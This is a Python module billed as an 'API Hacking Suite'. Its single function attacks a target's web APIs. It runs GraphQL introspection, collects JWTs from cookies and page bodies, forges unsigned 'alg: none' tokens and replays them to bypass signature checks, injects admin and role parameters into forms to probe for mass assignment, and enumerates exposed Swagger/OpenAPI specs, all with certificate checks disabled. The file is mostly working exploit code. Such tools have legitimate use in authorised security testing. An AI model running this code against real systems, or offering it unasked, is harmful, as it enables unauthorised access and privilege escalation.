"""
APEX API Hacking Suite
GraphQL introspection, JWT attacks, Mass Assignment, OpenAPI enumeration
"""
import json
import re
import base64
import requests
from urllib.parse import urljoin, urlparse


def scan_api(target_url, discovered):
    """Scan for API vulnerabilities: GraphQL, JWT, Mass Assignment, OpenAPI."""
    vulns = []
    sess = requests.Session()
    sess.verify = False

    # --- GraphQL Detection & Introspection ---
    graphql_endpoints = ['/graphql', '/gql', '/graphiql', '/v1/graphql', '/api/graphql', '/query']
    for ep in graphql_endpoints:
        try:
            url = urljoin(target_url, ep)
            # Try introspection query
            introspect_query = """
            query {
              __schema {
                types { name kind fields { name type { name kind ofType { name kind } } } }
                queryType { name fields { name args { name type { name kind ofType { name kind } } } } }
                mutationType { name fields { name args { name type { name kind ofType { name kind } } } } }
              }
            }
            """
            r = sess.post(url, json={'query': introspect_query}, timeout=5)
            if '__schema' in r.text and 'types' in r.text:
                vulns.append({
                    'type': 'graphql', 'subtype': 'introspection',
                    'endpoint': url,
                    'parameter': 'N/A',
                    'payload': 'Introspection query',
                    'result': 'GraphQL schema exposed via introspection',
                    'confirmed': True, 'severity': 'high',
                    'target': target_url,
                    'description': 'GraphQL introspection enabled — full schema exposed.'
                })
                break
            elif 'graphql' in r.text.lower() or 'query' in r.text.lower():
                vulns.append({
                    'type': 'graphql', 'subtype': 'endpoint',
                    'endpoint': url,
                    'parameter': 'N/A',
                    'payload': 'GraphQL endpoint detected',
                    'result': 'GraphQL endpoint found',
                    'confirmed': True, 'severity': 'medium',
                    'target': target_url,
                    'description': 'GraphQL endpoint discovered.'
                })
        except:
            pass

    # --- JWT Attacks ---
    jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
    for page in discovered.get('pages', [])[:10]:
        try:
            r = sess.get(page, timeout=5)
            # Check for JWT in response
            for cookie in r.cookies:
                if re.match(jwt_pattern, cookie.value):
                    vulns.append({
                        'type': 'jwt', 'subtype': 'token_exposed',
                        'endpoint': page,
                        'parameter': cookie.name,
                        'payload': cookie.value[:50] + '...',
                        'result': 'JWT token found in cookies',
                        'confirmed': True, 'severity': 'medium',
                        'target': target_url,
                        'description': 'JWT token exposed in cookies.'
                    })

            # Check for JWT in response body
            matches = re.findall(jwt_pattern, r.text)
            if matches:
                vulns.append({
                    'type': 'jwt', 'subtype': 'token_in_body',
                    'endpoint': page,
                    'parameter': 'N/A',
                    'payload': matches[0][:50] + '...',
                    'result': 'JWT token found in response body',
                    'confirmed': True, 'severity': 'medium',
                    'target': target_url,
                    'description': 'JWT token exposed in response body.'
                })

            # Test JWT None algorithm attack
            for match in matches[:3]:
                try:
                    parts = match.split('.')
                    if len(parts) == 3:
                        # Try none algorithm
                        none_header = base64.urlsafe_b64encode(
                            json.dumps({"alg": "none", "typ": "JWT"}).encode()
                        ).decode().rstrip('=')
                        forged_token = f'{none_header}.{parts[1]}.'
                        test_r = sess.get(page, headers={'Authorization': f'Bearer {forged_token}'}, timeout=5)
                        if test_r.status_code == 200:
                            vulns.append({
                                'type': 'jwt', 'subtype': 'none_algorithm',
                                'endpoint': page,
                                'parameter': 'Authorization',
                                'payload': forged_token[:50] + '...',
                                'result': 'JWT None algorithm accepted',
                                'confirmed': True, 'severity': 'critical',
                                'target': target_url,
                                'description': 'JWT accepts "none" algorithm — signature bypass possible.'
                            })
                            break
                except:
                    pass
        except:
            pass

    # --- Mass Assignment Detection ---
    mass_assignment_params = ['role', 'isAdmin', 'admin', 'is_admin', 'is_staff',
                               'is_superuser', 'superuser', 'permissions', 'access_level',
                               'account_type', 'plan', 'subscription', 'verified']
    for form in discovered.get('forms', [])[:10]:
        for inp in form.get('inputs', [])[:5]:
            name = inp.get('name', '').lower()
            if name in ['email', 'username', 'name', 'password']:
                # Try adding admin params
                for ma_param in mass_assignment_params[:5]:
                    try:
                        data = {name: 'test@test.com', ma_param: True}
                        if form.get('method') == 'post':
                            r = sess.post(form['url'], data=data, timeout=5)
                        else:
                            r = sess.get(form['url'], params=data, timeout=5)
                        if r.status_code == 200:
                            # Check if the param was reflected or accepted
                            if ma_param in r.text.lower():
                                vulns.append({
                                    'type': 'mass_assignment',
                                    'endpoint': form['url'],
                                    'parameter': ma_param,
                                    'payload': f'{ma_param}=true',
                                    'result': f'Parameter {ma_param} accepted',
                                    'confirmed': True, 'severity': 'high',
                                    'target': target_url,
                                    'description': f'Mass assignment possible via {ma_param}.'
                                })
                    except:
                        pass

    # --- OpenAPI/Swagger Enumeration ---
    swagger_paths = ['/swagger.json', '/swagger/v1/swagger.json', '/api-docs', '/api/swagger.json',
                     '/openapi.json', '/v2/api-docs', '/v3/api-docs', '/api/v1/openapi.json',
                     '/docs/api', '/api/docs', '/swagger-ui.html', '/swagger/index.html']
    for sp in swagger_paths:
        try:
            url = urljoin(target_url, sp)
            r = sess.get(url, timeout=5)
            if r.status_code == 200 and ('swagger' in r.text.lower() or 'openapi' in r.text.lower() or
                                          '"paths"' in r.text or '"info"' in r.text):
                vulns.append({
                    'type': 'openapi', 'subtype': 'exposed',
                    'endpoint': url,
                    'parameter': 'N/A',
                    'payload': 'OpenAPI spec found',
                    'result': 'API documentation exposed',
                    'confirmed': True, 'severity': 'medium',
                    'target': target_url,
                    'description': 'OpenAPI/Swagger documentation publicly accessible.'
                })
                break
        except:
            pass

    return vulns